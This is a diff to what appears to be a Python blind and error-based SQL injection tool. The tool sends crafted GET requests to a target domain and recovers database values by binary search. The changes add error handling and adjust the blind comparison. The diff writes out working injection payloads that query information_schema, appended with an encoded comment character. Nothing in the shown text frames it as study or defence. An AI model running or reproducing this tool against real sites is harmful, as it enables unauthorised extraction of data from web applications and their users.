@@ -6,6 +6,7 @@ import sys
 import time
 import argparse
 import error_sql as error
+import log as log
 
 global caller
 
@@ -33,16 +34,28 @@ conn = httplib.HTTPConnection(domain, "80")
 
 tmp_count = 0
 delims = "!~!~!"
+error_code = [400,401,403,404,405]
+
+
+def plus_white(query):
+    return query.replace(' ', '+')
 
 
 def httpreq(request_param):
     params = plus_white(tmp_params + "=" + request_param)
     #print params
-    conn.request("GET", path + "?" + params, None, headers)
-    response = conn.getresponse().read()
-    time.sleep(0.1)
-
-    return response
+    try:
+        conn.request("GET", path + "?" + params, None, headers)
+        #print(params)
+        connection  = conn.getresponse()
+        status_code = connection.status
+        #log.info("Status Code: "+connection.getcode())
+        response = connection.read()
+        time.sleep(0.1)
+        return response
+    except Exception as err:
+        log.info("Checking out the Website is available")
+        sys.exit()
 
 
 def error_httpreq(vuln_part):
@@ -52,20 +65,10 @@ def error_httpreq(vuln_part):
     response = conn.getresponse().read()  # 응답 값
     return response.split(delims)[1]
 
-def ck_blind_error():
-    tmp = "' and case when 1=2 then 1 else(select count(*) from information_schema.columns col1,information_schema.tables tab1,information_schema.tables tab2)end#"
-    #if caller_blind_httpreq():
-
-    #elif caller_time_httpreq(tmp) == 0:
-    #    return #아직 결정 ㄴ
-
-
-
 def caller_blind_httpreq(query):
     org_len = len(httpreq(org_params))
-    query_len = len(httpreq(query))+len(query.replace(' ',''))-len(org_params)
-
-    if org_len == query_len:
+    query_len = len(httpreq(org_params+query))+len(query.replace(' ',''))
+    if org_len <= query_len:
         return 1
     else:
         return 0
@@ -92,7 +95,7 @@ def binary_httpreq(min, max, query):
     # print query + ">" + str(mid)
 
     if caller == "blind":
-        payload = query + ">" + str(mid)
+        payload = query + ">" + str(mid) + "%23"
         cnt = caller_blind_httpreq(payload)
     else:
         payload = "' and case when " + query + ">" + str(mid) + " then 1 else(select count(*) from information_schema.columns col1,information_schema.tables tab1,information_schema.tables tab2)end%23"
@@ -111,5 +114,4 @@ def binary_httpreq(min, max, query):
         return binary_httpreq(min, mid, query)
 
 
-def plus_white(query):
-    return query.replace(' ', '+')
+
